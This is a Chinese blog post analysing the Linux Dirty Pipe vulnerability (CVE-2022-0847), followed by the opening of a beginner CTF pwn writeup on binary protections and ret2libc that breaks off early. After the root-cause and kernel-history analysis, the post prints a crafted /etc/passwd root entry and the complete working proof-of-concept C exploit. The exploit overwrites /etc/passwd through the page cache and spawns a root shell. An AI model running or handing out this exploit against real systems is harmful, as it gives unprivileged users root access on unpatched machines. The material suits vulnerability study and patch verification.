id="一、原理分析"><a href="#一、原理分析" class="headerlink" title="一、原理分析"></a>一、原理分析</h3><blockquote><p>splice()系统调用将包含文件的页面缓存(page cache), 链接到pipe的环形缓冲区(pipe_buffer)时, 在copy_page_to_iter_pipe 和 push_pipe函数中未能正确清除页面的”PIPE_BUF_FLAG_CAN_MERGE”属性, 导致后续进行pipe_write()操作时错误的判定”write操作可合并(merge)”, 从而将非法数据写入文件页面缓存, 导致任意文件覆盖漏洞。</p></blockquote><p>​    在了解了上述内容之后，这个原理就非常奇葩了。在调用零拷贝的核心函数splice函数时，存在这样的调用栈：</p><ul><li><p>SYSCALL_DEFINE6(splice,…) -&gt; __do_sys_splice -&gt; __do_splice-&gt; do_splice</p><ul><li><p>splice_file_to_pipe -&gt; do_splice_to</p><ul><li><p>generic_file_splice_read(in-&gt;f_op-&gt;splice_read 默认为 generic_file_splice_read)</p><ul><li><p>call_read_iter -&gt; filemap_read</p><ul><li>copy_page_to_iter -&gt; copy_page_to_iter_pipe</li></ul></li></ul></li></ul></li></ul></li></ul><p>​    漏洞所在的copy_page_to_iter_pipe 函数主要做的工作就是将pipe 缓存页结构指向要传输的文件的文件缓存页，其代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">copy_page_to_iter_pipe</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i_head = i-&gt;head;</span><br><span class="line"><span class="keyword">size_t</span> off;</span><br><span class="line"></span><br><span class="line">··· ···</span><br><span class="line"></span><br><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<span class="comment">//[1]获取对应的pipe 缓存页</span></span><br><span class="line">··· ···</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<span class="comment">//[2]修改pipe 缓存页的相关信息指向文件缓存页</span></span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;<span class="comment">//[2]页指针指向了文件缓存页</span></span><br><span class="line">buf-&gt;offset = offset;<span class="comment">//[2]offset len 等设置为当前信息(通过splice 传入参数决定)</span></span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code> 可以看到中间各种的赋值，就是在初始化Pipe_buf中的相应的内容，让其指向page cache，但是这里竟然没有初始化进行权限校验的flag。。。</code></pre><p>​    这个flag很明显就是为了针对用户不具有读写权限的文件，不能乱写，结果这里没初始化，那这个flag还有什么意义呢？一位<a href="https://blog.csdn.net/Breeze_CAT/article/details/123393188?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164878673016782246497863%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164878673016782246497863&biz_id=&utm_medium=distribute.pc_search_result.none-task-code-2allfirst_rank_ecpm_v1~rank_v31_ecpm-2-123393188-1.142v5pc_search_result_cache&utm_term=CVE-2022-0847%E5%88%86%E6%9E%90https://blog.csdn.net/weixin_44820088/article/details/123364275?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164878673016782246497863%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=164878673016782246497863&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2allfirst_rank_ecpm_v1~rank_v31_ecpm-4-123364275.142v5pc_search_result_cache&utm_term=CVE-2022-0847%E5%88%86%E6%9E%90&spm=1018.2226.3001.4187">前辈</a>也这么说：</p><blockquote><p>PIPE_BUF_FLAG_CAN_MERGE 这个flag 总共就出现了5次，一次#define 声明，两次在pipe_write 里。剩下两次都在splice 之中：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/099f85b6f8f249c8b52b6a88f4a1d0b1.png#pic_center" alt="在这里插入图片描述"></p><p>而且根据这个变量参与的代码可知，这个变量的意义就是是否允许在当前最新pipe 缓存页中续写；一般pipe 自己申请的页，就是个普通页，续写就续写很正常。什么情况不能续写，那就是这个页不是你pipe 自己申请的页，你不可以随便改。所以由目前的状况来看，几乎也就splice 中涉及到了非pipe 自己申请的页。换言之，PIPE_BUF_FLAG_CAN_MERGE 这个flag 就是为splice 设计的。然后你告诉我你不初始化的吗？</p></blockquote><p>​    在继续对这个洞深入了解之后，我发现是历史原因。。。</p><h3 id="二、漏洞的迭代过程"><a href="#二、漏洞的迭代过程" class="headerlink" title="二、漏洞的迭代过程"></a>二、漏洞的迭代过程</h3><p>参看：    <a href="https://www.anquanke.com/post/id/270067#h2-7">https://www.anquanke.com/post/id/270067#h2-7</a>    最后一部分</p><p>总结一下：</p><p>​    <a href="https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d">Linux 2.6</a>, 引入了<code>splice()</code>系统调用;</p><p>​    <a href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">Linux 4.9</a>, 添加了iov_iter（就是一个迭代器模型，不重要）对Pipe的支持, 其中<code>copy_page_to_iter_pipe()</code>与<code>push_pipe()</code>函数实现中当时就缺少对pipe buffer中<code>flag</code>的初始化操作！</p><p>​    但在当时并无大碍, 因为当时使用判断是否的属性：<code>can_merge</code>属性。</p><p>​    <a href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">Linux 5.1</a>, 由于在众多类型的pipe_buffer中, 只有<code>anon_pipe_buf_ops</code>这一种情况的<code>can_merge</code>属性是为1的(<code>can_merge</code>字段在结构体中占一个int大小的空间), 所以, 将<code>pipe_buf_operations</code>结构体中的<code>can_merge</code>属性删除, 并且把merge操作时的判断改为指针判断, 合情合理。正是如此, <code>copy_page_to_iter_pipe()</code>中对<code>buf-&gt;ops</code>的初始化操作已经不包含<code>can_merge</code>属性初始化的功能了, 只是<code>push_write()</code>中merge操作的判断依然正常, 所以依然不会触发漏洞。</p><p>​    简单的说，由于<code>can_merge</code>属性占空间，所有又被删掉了，添加了直接判断类型的代码。</p><p>​    <a href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Linux 5.8中</a>, 把各种类型的<code>pipe_buf_operations</code>结构体进行合并, 正式把<code>can_merge</code>标记改为<code>PIPE_BUF_FLAG_CAN_MERGE</code>合并进入flag属性中, 知道此时, 4.9补丁中<code>没有flag字段初始化</code>的隐患才真正生效。</p><p>​    简单的说，前面没有用到flag，所以没有初始化；后面用到了flag的时候，以为前面已经初始化了，就没有检查，总之还是愚蠢至极。</p><h2 id="0x03-poc构造"><a href="#0x03-poc构造" class="headerlink" title="0x03 poc构造"></a>0x03 poc构造</h2><h3 id="一、利用步骤"><a href="#一、利用步骤" class="headerlink" title="一、利用步骤"></a>一、利用步骤</h3><ul><li>创建一个管道</li><li>将管道填充满(通过pipe_write)，这样所有的buf(pipe 缓存页)都初始化过了，flag 默认初始化为PIPE_BUF_FLAG_CAN_MERGE</li><li>将管道清空(通过pipe_read)，这样通过splice 系统调用传送文件的时候就会使用原有的初始化过的buf结构。</li><li>调用splice 函数将想要篡改的文件传送入</li><li>继续向pipe写入内容(pipe_write)，这时就会覆盖到文件缓存页了，完成暂时文件篡改。</li></ul><h3 id="二、文件选择"><a href="#二、文件选择" class="headerlink" title="二、文件选择"></a>二、文件选择</h3><p>能越权读写之后，我们需要选择一个文件对其进行修改，达成提权的效果，那么选哪个呢？</p><p>​    在原poc中，他选择的文件是**/etc/passwd**：</p><p>我们先看看源文件里面有些什么：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220429140725028.png" alt="image-20220429140725028"></p><p>每个用户的形式以这样的结构表示</p><p><strong>用户名：密码：UID（用户ID）：GID（组ID）：描述性信息：主目录：默认Shell</strong></p><p>这里有两个关键字段：</p><h4 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h4><p>​    “x” 表示此用户设有密码，但不是真正的密码（也不能是，谁都能读还得了嘛），真正的密码保存在 /etc/shadow 文件中，但是这里也是可以存真实的密码加盐后的值的，因此我们可以利用。</p><h4 id="UID"><a href="#UID" class="headerlink" title="UID"></a>UID</h4><p>​    UID，也就是用户 ID。每个用户都有唯一的一个 UID，UID 是一个 0~65535 之间的数，不同范围的数字表示不同的用户身份，具体如表所示：</p><table><thead><tr><th>UID 范围</th><th>用户身份</th></tr></thead><tbody><tr><td>0</td><td>超级用户。UID 为 0 就代表这个账号是管理员账号。在 Linux 中，如何把普通用户升级成管理员呢？只需把其他用户的 UID 修改为 0 就可以了，这一点和 Windows 是不同的。不过不建议建立多个管理员账号。</td></tr><tr><td>1~499</td><td>系统用户（伪用户）。也就是说，此范围的 UID 保留给系统使用。其中，1<del>99 用于系统自行创建的账号；100</del>499 分配给有系统账号需求的用户。  其实，除了 0 之外，其他的 UID 并无不同，这里只是默认 500 以下的数字给系统作为保留账户，只是一个公认的习惯而已。</td></tr><tr><td>500~65535</td><td>普通用户。通常这些 UID 已经足够用户使用了。但不够用也没关系，2.6.x 内核之后的 Linux 系统已经可以支持 232 个 UID 了。</td></tr></tbody></table><h4 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h4><p>首先，使用perl语言生成带有盐值的密码：</p><p>​    命令： <code>perl -le ‘print crypt(“test”,“addedsalt”)’</code><br>​    输出：<em>adMpHktIn0tR2</em></p><p>然后将下面的内容，将test用户的信息加入到/etc/passwd 文件末尾；</p><p>​    <code>test:adMpHktIn0tR2:0:0:User_like_root:/root:/bin/bash</code></p><h3 id="三、poc"><a href="#三、poc" class="headerlink" title="三、poc"></a>三、poc</h3><h4 id="官方poc："><a href="#官方poc：" class="headerlink" title="官方poc："></a>官方poc：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class="line"><span class="comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prepare_pipe</span><span class="params">(<span class="keyword">int</span> p[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class="line"><span class="comment">   the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class="line"><span class="comment">   leaving the flags initialized) */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">r -= n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class="line"><span class="comment">   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class="line"><span class="comment">   will be mergeable */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> path = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Backing up /etc/passwd to /tmp/passwd.bak ...\n&quot;</span>);</span><br><span class="line">        FILE *f1 = fopen(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        FILE *f2 = fopen(<span class="string">&quot;/tmp/passwd.bak&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (f1 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open /etc/passwd\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (f2 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open /tmp/passwd.bak\n&quot;</span>);</span><br><span class="line">            fclose(f1);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">while</span> ((c = fgetc(f1)) != EOF)</span><br><span class="line">            fputc(c, f2);</span><br><span class="line"></span><br><span class="line">        fclose(f1);</span><br><span class="line">        fclose(f2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">loff_t</span> offset = <span class="number">4</span>; <span class="comment">// after the &quot;root&quot;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">const</span> data = <span class="string">&quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n&quot;</span>; <span class="comment">// openssl passwd -1 -salt aaron aaron </span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Setting root password to \&quot;aaron\&quot;...\n&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">loff_t</span> end_offset = offset + (<span class="keyword">loff_t</span>)data_size;</span><br><span class="line"><span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* open the input file and validate the specified offset */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> fd = open(path, O_RDONLY); <span class="comment">// yes, read-only! :-)</span></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create the pipe with all flags initialized with</span></span><br><span class="line"><span class="comment">   PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class="line"><span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">prepare_pipe(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* splice one byte from before the specified offset into the</span></span><br><span class="line"><span class="comment">   pipe; this will add a reference to the page cache, but</span></span><br><span class="line"><span class="comment">   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class="line"><span class="comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class="line">--offset;</span><br><span class="line"><span class="keyword">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the following write will not create a new pipe_buffer, but</span></span><br><span class="line"><span class="comment">   will instead write into the page cache, because of the</span></span><br><span class="line"><span class="comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line"><span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;(echo aaron; cat) | su - -c \&quot;&quot;</span></span><br><span class="line">                <span class="string">&quot;echo \\\&quot;Restoring /etc/passwd from /tmp/passwd.bak...\\\&quot;;&quot;</span></span><br><span class="line">                <span class="string">&quot;cp /tmp/passwd.bak /etc/passwd;&quot;</span></span><br><span class="line">                <span class="string">&quot;echo \\\&quot;Done! Popping shell... (run commands now)\\\&quot;;&quot;</span></span><br><span class="line">                <span class="string">&quot;/bin/sh;&quot;</span></span><br><span class="line">            <span class="string">&quot;\&quot; root&quot;</span>&#125;;</span><br><span class="line">        execv(<span class="string">&quot;/bin/sh&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;system() function call seems to have failed :(\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用思路和上述的思路是一样的。</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup-level3-攻防世界pwn新手区</title>
      <link href="/2022/04/20/writeup-level3-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/"/>
      <url>/2022/04/20/writeup-level3-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-level3-攻防世界pwn新手区"><a href="#writeup-level3-攻防世界pwn新手区" class="headerlink" title="writeup-level3-攻防世界pwn新手区"></a>writeup-level3-攻防世界pwn新手区</h1><p>学了web之后，顿时觉得pwn比web有意思多了哈哈哈哈，就是每次要开虚拟机好麻烦</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220419093735412.png" alt="image-20220419093735412"></p><h2 id="0x01保护机制总结"><a href="#0x01保护机制总结" class="headerlink" title="0x01保护机制总结"></a>0x01保护机制总结</h2><p>这里概述一下这几种保护机制：</p><ul><li><p><strong>RELRO：</strong>主要用来保护重定位表段对应数据区域，默认可写；</p><ul><li><strong>Partial</strong> RELRO got表不可写，got.plt可写 ；</li><li><strong>Full</strong> RELRO got表，got.plt不可写；</li></ul></li><li><p><strong>canary：</strong>在栈靠近栈底某个位置设置校验随机数，被覆盖就出现错误，防止栈溢出的一种保护；</p></li><li><p><strong>NX：</strong>堆、栈、BSS段没有执行权限；</p></li><li><p><strong>PIE：</strong>程序装载的位置是随机的；</p></li><li><p><strong>ASLR:</strong></p><ul><li>0， 不开启任何随机化；</li><li>1， 开启stack、libraries、 [executable base（special libraries -^-） if PIE is enabled while compiling] 的随机化；</li><li>2，开启heap随机化。</li></ul></li></ul><h2 id="0x02-动态链接库详解"><a href="#0x02-动态链接库详解" class="headerlink" title="0x02 动态链接库详解"></a>0x02 动态链接库详解</h2><p>​    <strong>ret2libc</strong> 这种攻击方式主要是针对 <strong>动态链接(Dynamic linking)</strong> 编译的程序，因为正常情况下是无法在程序中找到像 <strong>system() 、execve()</strong> 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。</p><p>​    程序是动态链接生成的，所以在程序运行时会调用 <strong>libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)<strong>，</strong>libc.so</strong> 是 linux 下 C 语言库中的运行库<strong>glibc</strong> 的动态链接版，并且 <strong>libc</strong>.<strong>so</strong> 中包含了大量的可以利用的函数，包括 <strong>system() 、execve()</strong> 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 <strong>system(“/bin/sh”)</strong> 来打开 shell， 如此就只剩下两个问题：</p><blockquote><p>1、找到 system() 函数的地址；</p></blockquote><blockquote><p> 2、在内存中找到 “/bin/sh” 这个字符串的地址。</p></blockquote><p>​    